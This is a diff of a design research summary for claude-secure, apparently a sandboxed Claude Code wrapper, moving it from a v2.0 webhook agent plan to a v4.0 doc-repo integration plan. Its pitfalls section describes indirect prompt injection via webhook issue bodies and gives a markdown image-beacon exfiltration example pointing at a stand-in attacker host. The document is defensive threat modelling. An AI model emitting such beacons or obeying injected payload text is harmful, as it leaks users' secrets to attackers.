@@ -1,202 +1,177 @@
 # Project Research Summary
 
-**Project:** claude-secure v2.0
-**Domain:** Webhook-triggered ephemeral agent mode for a security-isolated Claude Code wrapper
-**Researched:** 2026-04-11
+**Project:** claude-secure v4.0 Agent Documentation Layer
+**Domain:** Agent coordination infrastructure — bidirectional doc repo integration on top of a security-hardened, network-isolated Claude Code wrapper
+**Researched:** 2026-04-13
 **Confidence:** HIGH
 
 ## Executive Summary
 
-claude-secure v2.0 adds headless/ephemeral agent execution to an existing four-layer security wrapper. The v1.0 foundation (Docker Compose network isolation, Node.js buffered proxy with secret redaction, Python+iptables call validator, PreToolUse hook scripts) remains entirely unchanged — v2.0 layers event-driven orchestration on top without modifying any existing component. The core insight from research is that Claude Code's `-p` (non-interactive) flag run via `docker compose exec -T` is the only correct integration point: running Claude on the host via the Agent SDK would bypass all four security layers entirely, defeating the product's purpose.
+The v4.0 milestone turns the existing Phase 16 result channel (single-file report push) into a full documentation coordination layer. The doc repo becomes both an outbox (agents write structured reports, todo mutations, and architecture notes) and an inbox (webhook-dispatched tasks flow from doc-repo Issues into profile-scoped spawns). Research across all four dimensions confirms that approximately 70% of the required machinery already exists in Phases 12-17. The milestone is an extension, not a rebuild.
 
-The recommended architecture introduces three host-level components: a Node.js webhook listener (systemd user service) that receives GitHub events, a Bash event dispatcher that maps events to profiles and prompt templates, and a report writer that formats and pushes results to a documentation repo. A new profile system — a config-layer concept producing identical Docker Compose environment variables to the existing instance system — provides per-service isolation of secrets, whitelists, and workspaces. No new container types are needed; ephemeral runs use the existing compose stack with a unique COMPOSE_PROJECT_NAME per event and are torn down after each run.
+The recommended approach is conservative and additive: reuse the Phase 16 git-clone/commit/push harness for multi-file commits, extend the Phase 14/15 webhook listener with a new event routing rule for doc-repo pushes, add a Stop hook to enforce report writing, and extend profile.json with doc repo binding fields. No new containers, no new long-running services, no new host dependencies beyond bumping the git version check to 2.34. The only transport that satisfies atomicity and security requirements is `git push` over HTTPS with a fine-grained PAT held on the host, outside the Claude container.
 
-The primary risks fall into two categories: security correctness and operational reliability. On security: profile misconfiguration that routes an event to the wrong profile can leak secrets to Anthropic via the proxy (wrong whitelist = wrong redaction set), and using the `--bare` flag disables the very security hooks that make headless mode safe. On reliability: without a concurrency cap and container reaper, event bursts can exhaust host resources within minutes. Both risk categories must be addressed before any real webhook connections are established.
+The single highest-severity risk is architectural: the doc-repo write token must never enter the Claude container. All git operations must run in `bin/claude-secure` on the host (as Phase 16 already does), with the docs clone bind-mounted read-only into the container and agent-produced artifacts spool-filed to `/workspace/` for host-side pickup. Every other pitfall — Stop-hook loops, parallel push races, webhook prompt injection, markdown exfil beacons — has a well-defined prevention strategy and should be gated per phase. The security posture of v1.0 is preserved provided these constraints are enforced from the first design decision in each phase.
 
 ## Key Findings
 
 ### Recommended Stack
 
-v2.0 adds zero new container technologies and zero npm/pip dependencies. The webhook listener uses Node.js stdlib (`http`, `crypto`, `child_process`) consistent with the project's zero-dependency security philosophy. The profile system is a JSON/Bash config layer. Report delivery uses `git` CLI already present in the claude container. Process supervision uses systemd user services, already available on all target platforms.
+No new technologies are added to the stack. The v4.0 stack is entirely the existing v1.0-v3.0 stack with two precision additions: `git 2.34+` sparse/partial clone flags (`--filter=blob:none --sparse`) and a GitHub fine-grained PAT scoped to a single repository. The `gh` CLI, REST/GraphQL client libraries, `libgit2`, `dulwich`, polling daemons, and a fourth Docker container were all evaluated and rejected. The decisive factor in all rejections is security surface: each addition introduces a new secret-handling path or supply-chain dependency in a tool whose core value is eliminating uncontrolled egress.
 
-**Core technologies (new for v2.0):**
-- Claude Code CLI `-p` flag: headless execution — already in claude container, no new deps; `--output-format json` returns structured result/cost/turns metadata
-- Node.js stdlib `http`+`crypto`: webhook listener — HMAC-SHA256 signature validation and event dispatch in ~60 lines
-- Node.js `child_process.spawn`: Docker orchestration — non-blocking container lifecycle management from the host
-- Bash + `jq`: event handlers and report writer — consistent with existing hook scripts; extracts JSON fields and performs git operations
-- systemd user service: listener process supervision — `Restart=always`, `WatchdogSec=30`, journal logging; already on all target platforms
-- JSON profile files: per-service config — same format as existing `whitelist.json`; no new config schema needed
+**Core technologies (new or changed for v4.0):**
+- `git` CLI (2.34+): sparse + partial clone of docs repo — already installed, extend the Phase 16 clone pattern with `--filter=blob:none --sparse`
+- GitHub fine-grained PAT as `DOCS_REPO_TOKEN`: single-repo scoped credential, stored in profile `.env`, redacted automatically by Phase 3 proxy — preferred over classic PAT (full-repo access) and SSH deploy keys (key management surface)
+- `git push` over HTTPS with host-side PAT: atomic multi-file commits, 3-attempt jittered retry, never force-push — the only transport that supports atomicity; REST API (one file per call) and `gh` CLI (no atomic multi-file path) both rejected
 
-**Explicitly rejected (with rationale):**
-- `@anthropic-ai/claude-agent-sdk`: runs Claude on host, bypasses all security layers, requires API key not OAuth
-- `--bare` flag: documented as "recommended for scripted calls" but disables claude-secure's PreToolUse hooks
-- `@octokit/webhooks` npm package: 5-line `crypto.createHmac` replaces it with no supply-chain risk
-- `--dangerously-skip-permissions` without `--allowedTools`: maximum blast radius from prompt injection
+**Unchanged:** Node 22 proxy, Python 3.11 validator, Docker Compose internal network, iptables, Bash hooks.
 
 ### Expected Features
 
-**Must have (table stakes — v2.0 launch):**
-- Profile system (isolated whitelist, .env, workspace, prompt templates per service) — foundation for all other features
-- Webhook listener as systemd service with HMAC-SHA256 signature verification — entry point and first security gate
-- Event routing for three event types (issues.opened, push to main, workflow_run failure) — the stated scope
-- Headless spawn with `-p`, `--output-format json`, `--allowedTools`, `--max-turns`, `--max-budget-usd` — core execution
-- Ephemeral lifecycle (fresh workspace clone per run, `docker compose up`, execute, `docker compose down -v`) — clean state isolation
-- Result reporting (JSON parse -> markdown format -> git commit+push to docs repo) — the output channel
-- Execution audit logging with event metadata (webhook ID, event type, repo, cost, duration) — accountability
+**Must have (table stakes):**
+- T5: Profile ↔ doc repo binding — `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` in `.env` — unblocks everything
+- T1: Standardized agent report template — fixed schema: goal, where worked, what changed, what failed, how to test, future findings
+- T2: Per-project doc repo structure — `projects/<name>/todo.md`, `architecture.md`, `vision.md`, `ideas.md`, `specs/`, `reports/YYYY/MM/`
+- T3: Mandatory last-step reporting via Stop hook — best-effort with local spool, async ship, never blocks Claude exit
+- T6: INDEX.md append — one-line entry per report, same Stop hook commit
+- T4: Bidirectional task flow via GitHub Issues — label `agent-task` → `resolve_profile_by_docs_repo` → `do_spawn`
 
-**Should have (add after validation — v2.x):**
-- Cost tracking aggregation per profile and event type
-- Webhook replay / manual trigger (`claude-secure headless replay <event-id>`)
-- Prompt templates with `envsubst` variable substitution (replaces inline prompt construction)
-- Health monitoring with systemd watchdog and failure alerting
-- `claude-secure headless status` CLI command
+**Should have (differentiators):**
+- D1: Security-preserving report pipeline — report push traverses same redaction path as Anthropic traffic
+- D2: Scout findings feed back into todo.md — "Future Findings" bullets auto-appended as P3 items
 
-**Defer (v3+):**
-- Multi-event chaining (output of one feeds next)
-- PR creation for code changes (requires careful security review)
-- Notification integrations (Slack/Discord on failure)
-- Web UI dashboard (contradicts solo-dev deployment model)
-- Auto-merge of agent-created PRs (industry consensus: never)
+**Defer to v4.1+:** per-profile template inheritance (D3), TASKS.md file-polling (T4b), interactive-mode reporting
 
-**Competitive positioning:** The differentiator is not webhook handling (commodity) but running headless Claude Code with the same four-layer security isolation as interactive mode. No other solution (GitHub Actions, Copilot, Buildkite) redacts secrets from LLM context in headless/CI scenarios.
+**Never ship:** live dashboards, agent-rewritable architecture/vision docs without gating, verbose per-tool-call entries, auto-close Issues, custom markdown DSL, cross-project search, agent-authored profile changes.
 
 ### Architecture Approach
 
-v2.0 is a host-level orchestration layer around an unchanged Docker stack. The fundamental security boundary — Claude runs inside Docker, orchestration runs on the host via Docker CLI — is never crossed. The webhook listener receives events, validates signatures, dispatches to Bash handlers, which invoke `claude-secure --profile <name> --headless "<prompt>"`. That wrapper exports profile env vars, generates a unique COMPOSE_PROJECT_NAME, runs `docker compose up -d`, executes `docker compose exec -T claude claude -p ...`, captures JSON output, runs `docker compose down -v`, and passes results to the report writer.
+All git operations run on the host in `bin/claude-secure`, not inside the Claude container. The docs clone is bind-mounted read-only into the container so agents can read vision.md and architecture.md as context. Agent-produced artifacts are written to `/workspace/` then read by the host-side `publish_docs_bundle` after Claude exits, redacted, and committed in a single atomic push.
 
-**Major components (new for v2.0):**
-1. **Webhook Listener** (`listener/server.js`) — Node.js stdlib HTTP server; validates HMAC-SHA256; enforces concurrency limit (default 2-3); returns 202 immediately, dispatches asynchronously
-2. **Profile System** (`~/.claude-secure/profiles/<name>/`) — config directory containing `whitelist.json`, `.env`, `config.sh` (WORKSPACE_PATH, MAX_TURNS, MAX_BUDGET_USD, DOCS_REPO_PATH), `prompt-templates/`; plus `repo-map.json` for repo-to-profile routing
-3. **Event Dispatcher** (`listener/handlers/dispatch.sh`) — maps GitHub event type + action to profile + prompt template; performs `envsubst` substitution; invokes headless CLI path
-4. **Headless CLI Path** (addition to `bin/claude-secure`) — ~80 new lines; generates ephemeral COMPOSE_PROJECT_NAME; runs `docker compose exec -T` with correct flags; handles all exit scenarios
-5. **Report Writer** (`listener/report.sh`) — parses `--output-format json` output with `jq`; formats markdown with metadata; git commit+push to docs repo from outside Claude container
+**Major components (new or modified):**
+1. `bin/claude-secure: fetch_docs_context` — startup shallow+sparse clone, read-only bind mount, prompt variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`
+2. `bin/claude-secure: publish_docs_bundle` — extends `publish_report` to accept N (path, body) pairs, single atomic commit, 3-attempt retry; D-15 redactor runs over every staged file unconditionally
+3. `bin/claude-secure: stage_docs_update` — reads `/workspace/.todo-patch.md` and `/workspace/.ideas-append.md`, validates, redacts, queues for bundle commit
+4. Stop hook — verifies local spool file exists (no network); host-side async shipper sends spooled reports with backoff; `stop_hook_active` guard prevents re-prompt loops
+5. `webhook/listener.py: resolve_profile_by_docs_repo` — routes `push` and `issues.labeled` events from doc repo to correct profile
+6. `webhook/docs-templates/` — `agent-report.md`, `docs-task.md`, `todo-append.md`
 
-**Build order (from dependency analysis):** Profile system -> Headless CLI path -> Report writer -> Webhook listener (can develop in parallel with steps 2-3) -> Event handlers -> Integration + lifecycle
+**Must-NOT-touch:** `proxy/server.js`, `validator/`, `hooks/pretooluse.sh`, `compose.yaml` network topology.
 
 ### Critical Pitfalls
 
-1. **Profile misconfiguration leaks secrets across services** — Profile resolution must fail closed: no match = reject event entirely, never fall back to a default profile. Validate at load time that whitelist.json, .env, and workspace are distinct files (different inodes). Root-own profile directories.
+1. **Doc-repo token as egress channel (C-1)** — PAT in the Claude container makes git push an uncontrolled exfil path bypassing all four security layers. Prevention: PAT lives in host-only `.env`, never mounted into container; all git operations run on the host. Must be locked at Phase A — this is the single most dangerous architectural decision in v4.0.
 
-2. **Webhook HMAC validation errors** — Validate `X-Hub-Signature-256` against raw body Buffer BEFORE JSON parsing. Use `crypto.timingSafeEqual`. Strip `sha256=` prefix. Store webhook secret separately from profile secrets. Return 401 silently on failure. Handle `ping` event with 200.
+2. **Stop-hook loop on report failure (C-2)** — if Stop hook blocks on doc-repo network failure, Claude re-prompts indefinitely. Prevention: Stop hook only verifies local spool file (no network); async host-side shipper handles push with backoff; `stop_hook_active` guard is mandatory. Test: "doc repo DNS fails, assert Claude exits cleanly within 5 seconds."
 
-3. **Orphaned containers from failed spawns** — Every instance needs a unique COMPOSE_PROJECT_NAME (profile+event-id+timestamp). Two-layer cleanup: inline trap handler runs `docker compose down -v` after every run regardless of exit code; systemd timer reaper runs every 5 minutes to force-remove containers with `claude-secure.ephemeral=true` label older than max lifetime. Ship spawn and reaper together — never one without the other.
+3. **Parallel push race on shared doc repo (C-3)** — N concurrent agents pushing to `main` produce non-fast-forward rejections; shared files produce merge conflicts. Prevention: per-session filenames under `reports/<project>/<YYYY-MM-DD>/<session-id>.md` eliminate report collisions; host-side write daemon serializes pushes with `flock`; agents never write shared files directly.
 
-4. **`--bare` flag disabling security hooks** — Do NOT use `--bare` in claude-secure. The PreToolUse hooks are the security layer. Accept the 2-3s startup cost. Verify hook log entries exist after every ephemeral run.
+4. **Webhook payload as indirect prompt injection (C-4)** — issue bodies from the doc repo flowing into agent prompts is textbook indirect prompt injection. Prevention: structured fields only (repo name, issue number, labels), never raw issue body in prompts; agents fetch issue body as data; Phase 15 sanitization pass reused unconditionally; profile-scoped `allowed_repos` allowlist.
 
-5. **Concurrent event flood exhausting host resources** — Implement semaphore in webhook listener (default max 2-3). Always return 202 before spawning. Set `mem_limit`/`cpus` at service level (not `deploy:` section, which may be silently ignored on some versions). Verify enforcement with `docker stats --no-stream`.
-
-6. **Git credential leakage via report repo** — Report push must happen outside the Claude container. Host-side report.sh does git operations using a fine-grained PAT scoped to the report repo only. If the token must enter the container, it must be in profile's `whitelist.json`. Never use classic PATs with `repo` scope.
-
-7. **Prompt injection via event payloads** — Issue titles, commit messages, and CI logs are attacker-controlled. Sanitize and truncate all fields (issue body max 5000 chars). Wrap in clear delimiters. Scope `--allowedTools` narrowly per event type (read-only analysis: `Read,Glob,Grep`; never Bash for issue triage).
+5. **Markdown exfil beacons in agent-authored reports (C-5)** — `![](https://attacker.tld/?data=...)` in committed reports is fetched by any markdown renderer. Prevention: `publish_docs_bundle` runs markdown sanitizer over every staged file (strip external image refs, HTML comments, raw HTML); fixed-schema report with typed fields and length caps.
 
 ## Implications for Roadmap
 
-### Phase 1: Profile System
-**Rationale:** Everything else depends on correct profile isolation. Profiles must exist and be verified secure before any webhook connection is made. Build order confirmed by both ARCHITECTURE.md and PITFALLS.md independently.
-**Delivers:** Profile directory structure, repo-map.json routing, config.sh schema with headless-specific vars (MAX_TURNS, MAX_BUDGET_USD, DOCS_REPO_PATH, ALLOWED_TOOLS), validation logic (fail-closed resolution, inode checks, path sanitization), non-interactive profile creation script.
-**Addresses:** Profile system (P1), concurrent execution safety (via COMPOSE_PROJECT_NAME isolation)
-**Avoids:** Pitfall 1 (profile misconfiguration -> secret cross-contamination)
-**Research flag:** Standard pattern (mirrors existing instance system exactly). Skip `/gsd:research-phase`.
+### Phase A: Profile Schema Extension + Back-Compat Aliases
+**Rationale:** Everything else depends on the profile knowing where to write. Zero behavior change — safe to land first.
+**Delivers:** `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` with `REPORT_REPO_TOKEN` fallback; deprecation warnings.
+**Addresses:** T5
+**Avoids:** M-1 (separate `.docs-repo-key` file with 0400 perms)
 
-### Phase 2: Headless CLI Path
-**Rationale:** Core integration point. All subsequent phases build on the exact invocation flags and output JSON schema. Must be manually testable (`claude-secure --profile test --headless "echo hello"`) before event handlers are built.
-**Delivers:** `--profile` and `--headless` flags in `bin/claude-secure`; `docker compose exec -T` invocation with correct flags; all exit-code handling (empty result = retry once then fail; max-turns reached = flag incomplete); ephemeral lifecycle (up, execute, `down -v`); resource limits at service level verified by `docker inspect`.
-**Uses:** Claude Code `-p` flag, `--output-format json` schema, `--allowedTools` syntax
-**Implements:** Headless CLI path component
-**Avoids:** Pitfall 3 (orphaned containers), Pitfall 4 (`--bare` flag), resource limits silently ignored
-**Research flag:** Needs validation — known bug #7263 (empty output with large stdin >7000 chars) must be reproduced and worked around. Test `--allowedTools` prefix syntax (`Bash(git *)` with space before `*`).
+### Phase B: Multi-File Publish Bundle (Outbound Path)
+**Rationale:** Core deliverable. Immediately visible to users. Can proceed in parallel with Phase A.
+**Delivers:** `publish_docs_bundle` (multi-file atomic commit), `render_agent_report_bundle`, `agent-report.md` template, INDEX.md append, D-15 redactor on all staged files.
+**Addresses:** T1, T6, D1, D2 (scout findings section in template)
+**Avoids:** C-5 (markdown sanitizer in publish_docs_bundle), C-1 (PAT never in container), M-7 (redact all staged files)
 
-### Phase 3: Webhook Listener
-**Rationale:** Independent of event handlers and report writer — can be developed in parallel with Phase 2. Must be correct before any real webhook is connected. Listener without concurrency control is a resource bomb.
-**Delivers:** `listener/server.js` (Node.js stdlib, single route POST /webhook); HMAC-SHA256 validation on raw body before JSON parsing; `crypto.timingSafeEqual`; `ping` event handling; 202 Accepted before async dispatch; concurrency semaphore (default: 2); `GET /health` endpoint; systemd unit file with `Restart=always`, `WatchdogSec=30`, `MemoryMax=512M`, `User=`; `X-GitHub-Delivery` deduplication log.
-**Addresses:** Webhook listener (P1), GitHub signature verification (P1), concurrent execution safety
-**Avoids:** Pitfall 2 (HMAC validation errors), Pitfall 4 (event flood), Pitfall 9 (listener dies silently)
-**Research flag:** Standard pattern (Node.js crypto HMAC + systemd are well-documented). Skip `/gsd:research-phase`.
+### Phase C: fetch_docs_context + Read-Only Bind Mount
+**Rationale:** Agents need project context before working. Depends on Phase A. Delivers the read half of the bidirectional loop.
+**Delivers:** `fetch_docs_context` startup clone, read-only bind mount at `/agent-docs/`, prompt template variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`; graceful skip when absent.
+**Avoids:** m-4 (no `.git` mount), M-2 (unix socket, not host.docker.internal)
 
-### Phase 4: Event Handlers and Prompt Templates
-**Rationale:** Requires both profile system (Phase 1) and headless CLI path (Phase 2) to be working. Webhook listener (Phase 3) can be connected here for first end-to-end test.
-**Delivers:** `listener/handlers/dispatch.sh`; handler scripts for three event types (issues.opened, push to refs/heads/main, check_suite.completed+failure); prompt template files with `envsubst` substitution; payload field sanitization and truncation; per-event-type `--allowedTools` config in profile.
-**Addresses:** Event routing (P1), all three GitHub event types
-**Avoids:** Pitfall 7 (race conditions for same repo), Pitfall 8 (prompt injection)
-**Research flag:** Prompt injection sanitization patterns for LLM context may need research — effective delimiter strategies lack a single authoritative source. Consider `/gsd:research-phase`.
+### Phase D: Stop Hook + Spool-Based Mandatory Reporting
+**Rationale:** Enforcement point. Depends on Phases B and C. Makes reporting guaranteed rather than optional.
+**Delivers:** Stop hook (local spool verification only, no network); host-side async shipper with jittered backoff; `stage_docs_update` for todo/ideas patch artifacts; `stop_hook_active` guard; failure-mode spec.
+**Addresses:** T3
+**Avoids:** C-2 (hook never touches network), M-4 (spool size cap + LRU), m-3 (log SHA only)
+**Research flag:** Stop hook API field names — re-verify with Context7 at plan time.
 
-### Phase 5: Result Channel (Report Writing)
-**Rationale:** Final link in the chain. Requires structured output from Phase 2 and profile config (DOCS_REPO_PATH) from Phase 1.
-**Delivers:** `listener/report.sh` (jq JSON parsing, markdown formatting with metadata header, per-event unique file path `reports/{profile}/{YYYY-MM}/{timestamp}-{event-type}-{event-id}.md`); git operations outside Claude container using fine-grained PAT; conflict-free write strategy via unique paths; token not present in any ephemeral container environment.
-**Addresses:** Result reporting (P1)
-**Avoids:** Pitfall 5 (git credential leakage), Pitfall 7 (report repo merge conflicts)
-**Research flag:** Standard git operations. Fine-grained PAT scoping is well-documented. Skip `/gsd:research-phase`.
+### Phase E: Webhook Inbound Path (Doc Repo → Agent)
+**Rationale:** Completes the bidirectional loop. Depends on Phase D (outbound must be proven first). Highest-complexity phase.
+**Delivers:** `resolve_profile_by_docs_repo`, `docs-inbox`/`docs-todo` event types, path-based filter, `docs-task.md` prompt template, HMAC timing-safe comparison audit, profile-scoped repo allowlist.
+**Addresses:** T4
+**Avoids:** C-4 (structured fields only), M-5 (timing-safe HMAC), M-6 (no URLs from payload)
+**Research flag:** Needs `/gsd:research-phase` — `docs-inbox` event-type filter against real GitHub push payload shapes is a new design not yet validated.
 
-### Phase 6: Operational Hardening and Integration Testing
-**Rationale:** Security product requires verification that "looks done but isn't" items are actually done. Ten specific checklist items from PITFALLS.md require dedicated integration tests.
-**Delivers:** Container reaper (systemd timer, 5-minute interval, removes containers with `claude-secure.ephemeral=true` label older than max lifetime + corresponding volumes, networks, temp dirs); full integration test suite (end-to-end webhook-to-report, HMAC rejection, concurrent flood, orphan cleanup, resource limit verification, hook log verification per run, git token absence from container env); installer additions for systemd service and profile setup; example profile documentation.
-**Addresses:** Execution audit logging (P1), concurrent execution safety verification
-**Avoids:** All pitfalls via test verification (reaper addresses Pitfall 3; load test verifies Pitfall 4; `docker stats` verifies resource limits)
-**Research flag:** Standard integration testing. Skip `/gsd:research-phase`.
+### Phase F: Integration Tests + Operational Hardening
+**Rationale:** All functional phases complete; harden before v4.0 ship.
+**Delivers:** Roundtrip integration test (seed inbox → HMAC POST → assert docs commit delta); N=4 parallel-agent push test; M-3 token expiry warning; `claude-secure profile init-docs` bootstrap subcommand; report path migration documentation; back-compat test for Phase 16 profiles.
+**Addresses:** C-3 (parallel push test gates serialization strategy), M-3, M-4
 
 ### Phase Ordering Rationale
 
-- Profile system first because it is a direct dependency of every other phase — no headless spawn, event handler, or report writer can be correctly implemented without the profile contract.
-- Headless CLI path second because it is the core integration point; all subsequent phases build on knowing the exact invocation flags and output JSON schema.
-- Webhook listener third because it is independent of event handlers and can be tested with `curl` payloads before handlers exist.
-- Event handlers fourth because they require both profile system and headless path to be stable.
-- Result channel fifth because it requires known JSON output format (Phase 2) and profile DOCS_REPO_PATH (Phase 1).
-- Hardening last because it can only verify what exists — and the reaper must ship before production use.
+- A before C: profile schema must exist before fetch_docs_context knows which `docs_project_dir` to clone.
+- B before D: publish_docs_bundle must exist before the Stop hook can call it.
+- C before D: bind mount and prompt variables are preconditions for context-aware reports.
+- D before E: outbound path must be proven before accepting inbound tasks that trigger outbound writes.
+- A and B in parallel: neither depends on the other.
+- F last: integration tests cannot validate what isn't built.
 
 ### Research Flags
 
-Phases likely needing `/gsd:research-phase` during planning:
-- **Phase 4 (Event Handlers):** Prompt injection sanitization patterns for LLM context — effective delimiter strategies are nuanced without a single authoritative source.
+Phases needing `/gsd:research-phase`:
+- **Phase D:** Stop hook `stop_hook_active` field semantics and re-prompt trigger conditions — version-sensitive, re-verify with Context7 at plan time.
+- **Phase E:** `docs-inbox`/`docs-todo` event-type filter tuning against real GitHub push payload shapes — validate before writing listener code.
 
-Phases with standard patterns (skip `/gsd:research-phase`):
-- **Phase 1 (Profile System):** Mirrors existing instance system exactly. Config files + Bash + JSON.
-- **Phase 2 (Headless CLI Path):** Official Claude Code docs verified all flags. Prioritize testing bug #7263 workaround at implementation.
-- **Phase 3 (Webhook Listener):** Node.js crypto HMAC + systemd unit files are exceptionally well-documented.
-- **Phase 5 (Result Channel):** Standard git operations + GitHub fine-grained PAT docs are authoritative.
-- **Phase 6 (Hardening):** Integration testing patterns are project-specific; research adds little value.
+Phases with standard patterns (skip research-phase):
+- **Phase A:** profile.json schema extension follows existing Phase 12 patterns.
+- **Phase B:** multi-file git commit is a direct extension of proven Phase 16 harness.
+- **Phase C:** git sparse-checkout flags are documented and stable.
+- **Phase F:** test scaffolding follows Phase 16/17 shell-script pattern.
 
 ## Confidence Assessment
 
 | Area | Confidence | Notes |
 |------|------------|-------|
-| Stack | HIGH | Official Anthropic docs verified all Claude Code CLI flags. Node.js stdlib APIs stable for years. systemd unit file patterns mature and well-documented. |
-| Features | HIGH | Feature set derived from official Claude Code headless docs, GitHub webhook docs, and competitive analysis of GitHub Actions/Copilot patterns. MVP scope is conservative and validated against existing v1.0 capabilities. |
-| Architecture | HIGH | Validated against existing codebase (docker-compose.yml, bin/claude-secure). All unchanged components verified as unchanged by analyzing responsibilities. Build order validated by two independent research files agreeing. |
-| Pitfalls | HIGH | Sourced from official GitHub docs (HMAC validation), official Claude Code docs (--bare behavior), known bug tracker (issue #7263), Docker docs (deploy.resources.limits), and direct codebase analysis. Ten "looks done but isn't" verification criteria provided. |
+| Stack | HIGH | All decisions reuse proven Phase 16 transport; alternatives rejected with specific documented reasons; fine-grained PAT is GitHub's own recommendation since 2023 |
+| Features | HIGH | T1-T6 sourced from multiple independent converging specs (TASKS.md, Claude Code hooks reference, GitHub Agentic Workflows, HANDOFF.md pattern); anti-features grounded in architecture constraints |
+| Architecture | HIGH | Based on direct code inspection of shipped Phase 12-17 source (line numbers cited); only inbound webhook filter tuning is new design (MEDIUM for that section) |
+| Pitfalls | HIGH | C-1 is first-principles from v1.0 threat model; C-2 is documented Claude Code behavior; C-3 is standard distributed-git race; C-4/C-5 have canonical CVE-level case studies. MEDIUM only on exact Stop hook API fields at implementation time. |
 
 **Overall confidence:** HIGH
 
-### Gaps to Address
+## Gaps to Address
 
-- **Known bug #7263 (empty output with large stdin):** Research documents the bug and workaround (write context to file, use `--append-system-prompt-file`) but does not confirm fix status. Verify at Phase 2 implementation whether the bug affects expected webhook event prompt sizes.
-- **`--allowedTools` prefix match syntax:** Research notes `Bash(git *)` requires a space before `*`. Needs empirical verification during Phase 2 — subtle syntax errors are silent.
-- **Docker Compose `deploy.resources.limits` vs `mem_limit`:** The safe choice (top-level `mem_limit`/`cpus`) is documented but the exact Docker Compose version threshold where `deploy:` syntax works reliably is unclear. Verify with `docker inspect` at Phase 2.
-- **systemd in WSL2:** Requires systemd enabled via `/etc/wsl.conf` (`[boot] systemd=true`). Installer should detect this and configure or provide clear instructions. First-run UX risk.
-- **Report push handoff pattern:** Research recommends keeping git token out of Claude container (host-side report.sh). The exact mechanism for passing report content from container stdout to host-side script needs confirmation at Phase 5 — `--output-format json` stdout capture is the handoff point.
+- **Stop hook API version:** Re-verify `stop_hook_active` field name and re-prompt semantics with Context7 during Phase D planning.
+- **Webhook filter tuning:** Validate `payload.commits[].added/modified` path filter against a real GitHub push payload before Phase E implementation.
+- **todo.md line-anchor format:** GFM task list with `<!-- id:abc123 -->` vs YAML frontmatter — needs a decision before Phase D ships `stage_docs_update`. Recommendation: GFM with comment anchor.
+- **Docs repo bootstrapping UX:** Stub in Phase C (create dirs on first clone if absent) vs full subcommand in Phase F — lock at roadmap time.
+- **Report path migration:** Old flat `reports/YYYY/MM/` vs new `projects/<name>/reports/` — lock before Phase B writes any new reports. Recommendation: new reports go under project dir; document the cutover in v4.0 release notes.
 
 ## Sources
 
 ### Primary (HIGH confidence)
-- [Claude Code headless mode docs](https://code.claude.com/docs/en/headless) — `-p`, `--bare`, `--output-format json`, `--max-turns`, `--allowedTools`, `--max-budget-usd`, `--no-session-persistence` flags; output JSON schema
-- [Claude Code CLI reference](https://code.claude.com/docs/en/cli-reference) — complete flag inventory
-- [Claude Code permission modes](https://code.claude.com/docs/en/permission-modes) — `--allowedTools` prefix match syntax, `--dangerously-skip-permissions` risks
-- [Claude Agent SDK overview](https://code.claude.com/docs/en/agent-sdk/overview) — confirmed SDK spawns CLI internally; API key requirement (no OAuth)
-- [GitHub: Validating webhook deliveries](https://docs.github.com/en/webhooks/using-webhooks/validating-webhook-deliveries) — HMAC-SHA256 validation, raw body requirement, timing-safe comparison
-- [GitHub: Managing personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) — fine-grained vs classic PATs
-- [Docker: Resource constraints](https://docs.docker.com/engine/containers/resource_constraints/) — memory and CPU limits
-- [Docker Compose Deploy Specification](https://docs.docker.com/reference/compose-file/deploy/) — deploy.resources.limits behavior in non-Swarm mode
-- claude-secure v1.0 codebase — docker-compose.yml, bin/claude-secure, pre-tool-use.sh; primary source for integration point analysis
+- `.planning/phases/16-result-channel/16-CONTEXT.md` — D-01 through D-18 locked decisions; canonical Phase 16 transport reference
+- `.planning/phases/14-webhook-listener/14-CONTEXT.md` — inbound webhook substrate
+- `.planning/phases/15-event-handlers/15-CONTEXT.md` — template fallback chain + payload sanitization
+- `bin/claude-secure` (direct code inspection, lines 343-1424) — publish_report, audit writer, do_spawn
+- `webhook/listener.py` (direct code inspection, lines 44-535) — event type, filter, profile resolver
+- GitHub fine-grained PAT docs (official) — scoping, 366-day expiry, per-repo permissions
+- git-sparse-checkout documentation (official) — `--filter=blob:none --sparse`, stable since git 2.25
+- Claude Code hooks reference — Stop hook semantics, `stop_hook_active`
+- TASKS.md spec (tasksmd.github.io) — per-project doc layout, Scout pattern, GFM task format
 
 ### Secondary (MEDIUM confidence)
-- [Anthropic Auto Mode Engineering Blog](https://www.anthropic.com/engineering/claude-code-auto-mode) — headless invocation patterns
-- [GitHub Agentic Workflows Technical Preview](https://github.blog/changelog/2026-02-13-github-agentic-workflows-are-now-in-technical-preview/) — industry patterns for webhook-triggered agents
-- [Claude Code Bug #7263](https://github.com/anthropics/claude-code/issues/7263) — empty output with large stdin (>7000 chars)
-- [adnanh/webhook](https://github.com/adnanh/webhook) — webhook server + systemd integration reference patterns
-- [GitHub: Rate limits for the REST API](https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api) — secondary rate limits, abuse detection
+- GitHub Agentic Workflows technical preview (Feb 2026) — Issues-as-task-queue direction
+- Allen Chan AI Agent Anti-Patterns Part 2 (Mar 2026) — verbose tool-trace anti-pattern
+- Anthropic 2026 Agentic Coding Trends Report — layered-review pattern
+- Checkmarx / Copilot Chat markdown injection writeup — C-5 image-beacon exfil
+- Legit Security GitLab Duo remote prompt injection — C-4 canonical case
 
-### Tertiary (LOW confidence)
-- [@octokit/webhooks npm v13.x](https://www.npmjs.com/package/@octokit/webhooks) — version noted from Dec 2025 publish date; referenced only to document rejection rationale
+### Tertiary (LOW confidence — validate during implementation)
+- Stop hook exact JSON field names — re-verify with Context7 at Phase D planning time
+- GitHub push webhook payload shape for path-based filter — validate with real payload before Phase E
 
 ---
-*Research completed: 2026-04-11*
+*Research completed: 2026-04-13*
 *Ready for roadmap: yes*
